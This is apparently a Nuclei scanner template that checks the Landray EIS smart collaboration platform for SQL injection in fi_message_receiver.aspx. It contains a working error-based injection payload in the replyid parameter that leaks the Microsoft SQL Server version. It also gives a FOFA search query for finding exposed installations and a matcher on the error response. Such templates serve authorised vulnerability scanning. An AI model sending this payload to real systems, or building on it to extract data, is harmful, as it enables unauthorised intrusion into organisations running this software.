id: landray-fi-message-receiver-sqli

info:
  name: 蓝凌EIS智慧协同平台 fi_message_receiver.aspx SQL注入
  author: onewin
  severity: high
  description: |-
    蓝凌EIS智慧协同平台 fi_message_receiver.aspx SQL注入
  metadata:
    fofa-query: body="/Scripts/jquery.landray.dialog.js"
  tags: 蓝凌EIS智慧协同平台,LandRay-OA

http:
  - raw:
      - |+
        @timeout: 30s
        GET /Message/fi_message_receiver.aspx?replyid=1%20and%201=@@version--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close


    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "Microsoft SQL Server")'
          - "status_code == 500"
        condition: and
